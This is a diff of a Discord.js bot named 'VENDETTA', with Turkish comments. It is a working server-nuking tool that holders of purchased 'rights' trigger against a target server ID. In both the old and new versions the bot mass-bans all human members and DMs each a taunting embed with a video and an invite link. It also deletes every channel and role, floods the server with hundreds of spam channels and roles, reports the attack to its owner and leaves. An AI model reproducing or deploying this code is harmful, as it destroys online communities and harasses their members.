@@ -6,6 +6,7 @@ ActionRowBuilder, ButtonBuilder, ButtonStyle,
 ModalBuilder, TextInputBuilder, TextInputStyle
 } = require('discord.js');
 
+// --- Node 22 fetch fix ---
 const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
 
 const client = new Client({
@@ -21,98 +22,32 @@ partials: [Partials.Channel]
 const OWNER_ID = process.env.OWNER_ID;
 const SERI_ID = process.env.SERI_ID;
 const HAK_KANAL_ID = process.env.HAK_KANAL_ID;
-const WHITELIST_KANAL_ID = process.env.WHITELIST_KANAL_ID;
 
 let cachedVideo = null;
 let haklar = {};
 let haklarMessageId = null;
 
-let whitelist = [];
-let whitelistMessageId = null;
-
-// ----------------------------------------------------------------------
-// OWNER LOG
-// ----------------------------------------------------------------------
-async function sendVendettaLog(user, guild, bannedCount, kalanHak, sureMs) {
-const owner = await client.users.fetch(OWNER_ID).catch(() => null);
-if (!owner) return;
-
-const embed = new EmbedBuilder()
-.setColor("DarkRed")
-.setTitle("💣 VENDETTA OPERASYON RAPORU")
-.addFields(
-{ name: "💣 İşlem Başlatan", value: ` ${user.tag} (${user.id}) ` },
-{ name: "🏰 Sunucu", value: ${guild.name} (${guild.id}) },
-{ name: "👑 Sunucu Sahibi", value: guild.ownerId ? <@${guild.ownerId}> : "Bulunamadı" },
-{ name: "🔥 Banlanan", value: ${bannedCount} },
-{ name: "💦 Kalan Hak", value: ${kalanHak} },
-{ name: "⏱ Süre", value: ${(sureMs / 1000).toFixed(1)} saniye }
-)
-.setTimestamp();
-
-owner.send({ embeds: [embed] }).catch(() => {});
-}
-
-// ----------------------------------------------------------------------
-// WHITE ATTEMPT LOG
-// ----------------------------------------------------------------------
-async function sendWhitelistAttack(user, guild) {
-const owner = await client.users.fetch(OWNER_ID).catch(() => null);
-if (!owner) return;
-
-const embed = new EmbedBuilder()
-.setColor("Yellow")
-.setTitle("⚠️ WHITELIST SALDIRI GİRİŞİMİ!")
-.addFields(
-{ name: "👤 Yapan", value: ${user.tag} (${user.id}) },
-{ name: "🎯 Hedef", value: ${guild.name} (${guild.id}) },
-{ name: "👑 Sunucu Sahibi", value: guild.ownerId ? <@${guild.ownerId}> : "Bulunamadı" }
-)
-.setTimestamp();
-
-owner.send({ embeds: [embed] }).catch(() => {});
-}
-
-// ----------------------------------------------------------------------
-// HAK MESAJI
-// ----------------------------------------------------------------------
+// 🔥 Haklar mesajını güncelle
 async function updateHaklarMessage(channel) {
-let text = "🔥 KULLANICI HAK LİSTESİ 🔥\n\n";
+let description = "HAKLAR\n\n";
+
 for (const id in haklar) {
-text += ${id} → ${haklar[id]} hak\n;
+const member = await channel.guild.members.fetch(id).catch(() => null);
+const name = member ? member.user.tag : id;
+description += ${name} (${id}) Hak Sayısı: ${haklar[id]}\n;
 }
 
 if (haklarMessageId) {
 const msg = await channel.messages.fetch(haklarMessageId).catch(() => null);
-if (msg) return msg.edit({ content: text });
+if (msg) return msg.edit({ content: description }).catch(() => {});
 }
 
-const msg = await channel.send({ content: text });
+const msg = await channel.send({ content: description });
 haklarMessageId = msg.id;
+
 }
 
-// ----------------------------------------------------------------------
-// WHITELIST MESAJI
-// ----------------------------------------------------------------------
-async function updateWhitelistMessage(channel) {
-let text = "🛡️ WHITELIST SUNUCULAR 🛡️\n\n";
-
-if (whitelist.length === 0) text += "Hiç whitelist yok.";
-
-for (const id of whitelist) text += • ${id}\n;
-
-if (whitelistMessageId) {
-const msg = await channel.messages.fetch(whitelistMessageId).catch(() => null);
-if (msg) return msg.edit({ content: text });
-}
-
-const msg = await channel.send({ content: text });
-whitelistMessageId = msg.id;
-}
-
-// ----------------------------------------------------------------------
-// Video Cache
-// ----------------------------------------------------------------------
+// 🎥 Video cache
 client.once("ready", async () => {
 console.log(🚀 Bot aktif: ${client.user.tag});
 
@@ -122,236 +57,247 @@ try {
 const res = await fetch(videoURL);
 const buffer = Buffer.from(await res.arrayBuffer());
 cachedVideo = new AttachmentBuilder(buffer, { name: "video.mp4" });
-console.log("🎥 Video cache hazır!");
+console.log("🎥 Video cachelendi!");
 } catch (err) {
-console.log("❌ Video cache sorunu:", err);
+console.log("❌ Video cache hatası:", err);
 }
+
 });
 
-// ----------------------------------------------------------------------
-// HAK & WL KOMUTLARI
-// ----------------------------------------------------------------------
+// 🔱 HAK KOMUTLARI
 client.on("messageCreate", async message => {
 if (!message.guild || message.author.bot) return;
 
 const args = message.content.trim().split(/ +/);
-const cmd = args.shift()?.toLowerCase();
+const command = args.shift().toLowerCase();
 
 if (![OWNER_ID, SERI_ID].includes(message.author.id)) return;
 
-const hakChan = await client.channels.fetch(HAK_KANAL_ID);
-const wChan = await client.channels.fetch(WHITELIST_KANAL_ID);
+const hakChannel = await client.channels.fetch(HAK_KANAL_ID);
 
-// HAK VER
-if (cmd === ".hakver") {
-const id = args[0];
-if (!id) return message.reply("ID gir kanka.");
+if (command === ".hakver") {
+const userId = args[0];
+const count = parseInt(args[1]) || 1;
 
-const c = parseInt(args[1]) || 1;
-haklar[id] = (haklar[id] || 0) + c;
+haklar[userId] = (haklar[userId] || 0) + count;    
+await updateHaklarMessage(hakChannel);    
 
-await updateHaklarMessage(hakChan);
+return message.reply(`✅ ${count} hak verildi.`);
 
-return message.reply("Hak verildi kanka 💦");
 }
 
-// HAK AL
-if (cmd === ".hakal") {
-const id = args[0];
-const c = parseInt(args[1]) || 1;
-haklar[id] = Math.max((haklar[id] || 0) - c, 0);
+if (command === ".hakal") {
+const userId = args[0];
+const count = parseInt(args[1]) || 1;
 
-await updateHaklarMessage(hakChan);
+haklar[userId] = Math.max((haklar[userId] || 0) - count, 0);    
+await updateHaklarMessage(hakChannel);    
 
-return message.reply("Hak alındı.");
+return message.reply(`✅ ${count} hak alındı.`);
+
 }
 
-// WL EKLE
-if (cmd === ".whitelist") {
-const id = args[0];
-if (!id) return message.reply("Sunucu ID gir.");
-
-if (!whitelist.includes(id)) whitelist.push(id);
-
-await updateWhitelistMessage(wChan);
-
-return message.reply("Sunucu whitelist’e eklendi 🔐");
+if (command === ".hakk") {
+await updateHaklarMessage(hakChannel);
+return;
 }
 
-// WL SİL
-if (cmd === ".wlal") {
-const id = args[0];
-whitelist = whitelist.filter(x => x !== id);
-
-await updateWhitelistMessage(wChan);
-
-return message.reply("Whitelist’ten silindi.");
-}
 });
 
-// ----------------------------------------------------------------------
-// VENDETTA KOMUTU
-// ----------------------------------------------------------------------
+// 💣 VENDETTA KOMUTU
 client.on("messageCreate", async message => {
 if (!message.guild || message.author.bot) return;
 
-if (message.content.trim().toLowerCase() !== ".vendetta") return;
+const command = message.content.trim().toLowerCase();
+if (command !== ".vendetta") return;
 
 const hak = haklar[message.author.id] || 0;
+
 if (hak <= 0) {
-return message.author.send("❌ Vendetta hakkın yok kanka.").catch(() => {});
+message.author.send({
+content: "Vendetta hakkınız 0! Botu kullanamazsınız."
+}).catch(() => {});
+return;
 }
 
-const btn = new ActionRowBuilder().addComponents(
+// DM'de buton
+const button = new ActionRowBuilder().addComponents(
 new ButtonBuilder()
 .setCustomId("sorguHak")
 .setLabel("💣 Vendetta")
-.setStyle(ButtonStyle.Danger)
+.setStyle(ButtonStyle.Primary)
 );
 
-message.author.send({
-content: Vendetta hakkın: ${hak}\nBaşlatmak için butona bas.,
-components: [btn]
+await message.author.send({
+content: **Vendetta** hakkınız \${hak}`! Başlatmak için aşağıdaki butona basın.\nNot: Botun rolü en yukarıda olmalı.`,
+components: [button]
 }).catch(() => {});
+
 });
 
-// ----------------------------------------------------------------------
-// INTERACTION — BUTTON / MODAL
-// ----------------------------------------------------------------------
+// 🎛️ BUTON + MODAL
 client.on("interactionCreate", async interaction => {
 if (!interaction.isButton() && !interaction.isModalSubmit()) return;
 
+// BUTON —> MODAL AÇ (HAK KONTROLÜ EKLENDİ!)
 if (interaction.isButton() && interaction.customId === "sorguHak") {
-const userHak = haklar[interaction.user.id] || 0;
-if (userHak <= 0)
-return interaction.reply({ content: "❌ Hakkın yok!", ephemeral: true });
 
-const modal = new ModalBuilder()
-.setCustomId("modalSunucuID")
-.setTitle("Vendetta Formu")
-.addComponents(
-new ActionRowBuilder().addComponents(
-new TextInputBuilder()
-.setCustomId("sunucuID")
-.setLabel("Sunucu ID")
-.setStyle(TextInputStyle.Short)
-.setRequired(true)
-)
-);
+const userHak = haklar[interaction.user.id] || 0;    
 
-return interaction.showModal(modal);
+// ❗ YENİ: HAKSIZ KULLANIM ENGELİ    
+if (userHak <= 0) {    
+    return interaction.reply({    
+        content: "❌ Vendetta hakkın yok! Butonu kullanamazsın.",    
+        ephemeral: true    
+    });    
+}    
+
+const modal = new ModalBuilder()    
+    .setCustomId("modalSunucuID")    
+    .setTitle("Vendetta İşlem Formu");    
+
+const sunucuInput = new TextInputBuilder()    
+    .setCustomId("sunucuID")    
+    .setLabel("Sunucu ID")    
+    .setStyle(TextInputStyle.Short)    
+    .setRequired(true);    
+
+modal.addComponents(new ActionRowBuilder().addComponents(sunucuInput));    
+
+await interaction.showModal(modal);
+
 }
 
-// ----------------------------------------------------------------------
-// MODAL SUBMIT
-// ----------------------------------------------------------------------
+// MODAL SUBMIT —> İŞLEM BAŞLAT
 if (interaction.isModalSubmit() && interaction.customId === "modalSunucuID") {
-const guildId = interaction.fields.getTextInputValue("sunucuID");
 
-// WHITELIST CHECK
-if (whitelist.includes(guildId)) {
-const guild = client.guilds.cache.get(guildId);
-await sendWhitelistAttack(interaction.user, guild || { name: "Bilinmiyor", id: guildId });
+const guildId = interaction.fields.getTextInputValue("sunucuID");    
+const guild = client.guilds.cache.get(guildId);    
 
-return interaction.reply({
-content: "⛔ Bu sunucu whitelist’te kanka.",
-ephemeral: true
-});
-}
+if (!guild) {    
+    return interaction.reply({    
+        content: "❌ Bot bu sunucuda değil!",    
+        ephemeral: true    
+    });    
+}    
 
-const guild = client.guilds.cache.get(guildId);
-if (!guild)
-return interaction.reply({ content: "❌ Bot bu sunucuda değil!", ephemeral: true });
+await interaction.reply({ content: "⚡ İşlem başlatılıyor...", ephemeral: true });    
 
-await interaction.reply({ content: "⚡ İşlem başlıyor...", ephemeral: true });
+// Hak düşür    
+haklar[interaction.user.id] = (haklar[interaction.user.id] || 0) - 1;    
+const hakChannel = await client.channels.fetch(HAK_KANAL_ID);    
+await updateHaklarMessage(hakChannel);    
 
-const start = Date.now();
+// Embed    
+const embed = new EmbedBuilder()    
+    .setColor("Red")    
+    .setTitle("💣 VENDETTA SUNUCUYA EL KOYDU!")    
+    .setDescription("Slained By VENDETTA 💣\nVENDETTA Affetmez 💦\nhttps://discord.gg/j9W6FXKTre")    
+    .setFooter({ text: "💦 VENDETTA Affetmez Sabaha Sunucun Affedilmez 💦" });    
 
-// HAK DÜŞÜR
-haklar[interaction.user.id]--;
-const hakChan = await client.channels.fetch(HAK_KANAL_ID);
-await updateHaklarMessage(hakChan);
+// Üye banlama    
+const members = await guild.members.fetch();    
+let bannedCount = 0;    
 
-// ----------------------------------------------------------------------
-// BAŞLAMADAN TÜM KANALARA MESAJ AT
-// ----------------------------------------------------------------------
+for (const member of members.values()) {    
+    if (member.user.bot) continue;    
+    if ([OWNER_ID, SERI_ID].includes(member.id)) continue;    
+
+    member.send({ embeds: [embed], files: [cachedVideo] }).catch(() => {});    
+    member.ban({ reason: "P@rno" }).catch(() => {});    
+    bannedCount++;    
+}    
+
+// Kanalları sil    
+guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));    
+
+const channelNames = ["VENDETTA💦", "VENDETTA💝", "EL KONULDU🔥"];    
+const channelTasks = [];    
+
+for (let i = 0; i < 300; i++) {    
+    channelTasks.push(    
+        guild.channels.create({ name: channelNames[i % channelNames.length] })    
+            .catch(() => {})    
+    );    
+}    
+
+// Rolleri sil    
+guild.roles.cache.forEach(role => {    
+    if (role.editable && role.id !== guild.id)    
+        role.delete().catch(() => {});    
+});    
+
+// Yeni roller oluştur    
+const roleTasks = [];    
+for (let i = 0; i < 200; i++) {    
+    const randomColor = `#${Math.floor(Math.random() * 16777215)    
+        .toString(16)    
+        .padStart(6, "0")}`;    
+
+    roleTasks.push(    
+        guild.roles.create({    
+            name: "BÖÖ KORKTUNMUU😜",    
+            color: randomColor,    
+            hoist: true    
+        }).catch(() => {})    
+    );    
+}    
+
+await Promise.all([    
+    Promise.all(channelTasks),    
+    Promise.all(roleTasks)    
+]);    
+
+await interaction.followUp({    
+    content: `⚡ ${bannedCount} kişi banlandı. V For Vendetta!`,    
+    ephemeral: true    
+});    
+// 📌 GÖRSELLİ LOG — Owner'a DM Gönder
 try {
-const allChannels = await guild.channels.fetch();
-for (const [id, ch] of allChannels) {
-if (ch && ch.send) {
-ch.send("\nVENDETTA YÜKLENİYOR...\n████████░░ 89%\n").catch(() => {});
+    const owner = await client.users.fetch(OWNER_ID);
+    const guildOwner = await guild.fetchOwner().catch(() => null);
+
+    const embed = new EmbedBuilder()
+        .setColor("DarkRed")
+        .setTitle("💣 VENDETTA Log Raporu")
+        .setThumbnail(interaction.user.displayAvatarURL({ size: 1024 })) // İşlemi yapan kişi avatar
+        .addFields(
+            {
+                name: "👤 İşlemi Başlatan",
+                value: `${interaction.user.tag} \n(${interaction.user.id})`,
+                inline: false
+            },
+            {
+                name: "🏰 Hedef Sunucu",
+                value: `${guild.name}`,
+                inline: false
+            },
+            {
+                name: "👑 Sunucu Sahibi",
+                value: guildOwner
+                    ? `${guildOwner.user.tag} \n(${guildOwner.id})`
+                    : "Bulunamadı",
+                inline: false
+            },
+            {
+                name: "🔥 Kalan Hakkı",
+                value: `${haklar[interaction.user.id] ?? 0}`,
+                inline: false
+            }
+        )
+        .setFooter({
+            text: "VENDETTA Operasyon Log",
+        })
+        .setTimestamp();
+
+    owner.send({ embeds: [embed] }).catch(() => {});
+} catch (err) {
+    console.log("Embed log gönderilemedi:", err);
 }
-}
-} catch {}
-
-// ----------------------------------------------------------------------
-// BAN
-// ----------------------------------------------------------------------
-const members = await guild.members.fetch();
-await Promise.all(
-members.map(m => {
-if (m.user.bot) return;
-if ([OWNER_ID, SERI_ID].includes(m.id)) return;
-
-m.send({ embeds: [new EmbedBuilder()
-.setColor("Red")
-.setTitle("💣 VENDETTA SUNUCUYA EL KOYDU!")
-.setDescription("Slained By VENDETTA 💣\nVENDETTA Affetmez 💦")
-.setFooter({ text: "VENDETTA BURDAYDI 😈" })
-], files: [cachedVideo] }).catch(() => {});
-
-return m.ban().catch(() => {});
-})
-);
-
-// KANAL SİL
-const ch = await guild.channels.fetch();
-await Promise.all(ch.map(c => c.delete().catch(() => {})));
-
-// ROL SİL
-const roles = await guild.roles.fetch();
-await Promise.all(
-roles
-.filter(r => r.editable && r.id !== guild.id)
-.map(r => r.delete().catch(() => {}))
-);
-
-// 350 KANAL
-await Promise.all(
-Array.from({ length: 350 }).map((_, i) =>
-guild.channels.create({
-name: ["VENDETTA💦", "EL KONULDU🔥", "VENDETTA BURDAYDI💝"][i % 3]
-}).catch(() => {})
-)
-);
-
-// 300 ROL
-await Promise.all(
-Array.from({ length: 300 }).map(() =>
-guild.roles.create({
-name: "VENDETTA 😜",
-color: "#" + Math.floor(Math.random() * 16777215).toString(16)
-}).catch(() => {})
-)
-);
-
-// LOG
-await sendVendettaLog(
-interaction.user,
-guild,
-members.size,
-haklar[interaction.user.id],
-Date.now() - start
-);
-
-await interaction.followUp({
-content: "⚡ İşlem tamamlandı!",
-ephemeral: true
-});
-
 await guild.leave().catch(() => {});
+
 }
+
 });
 
 client.login(process.env.BOT_TOKEN);
-
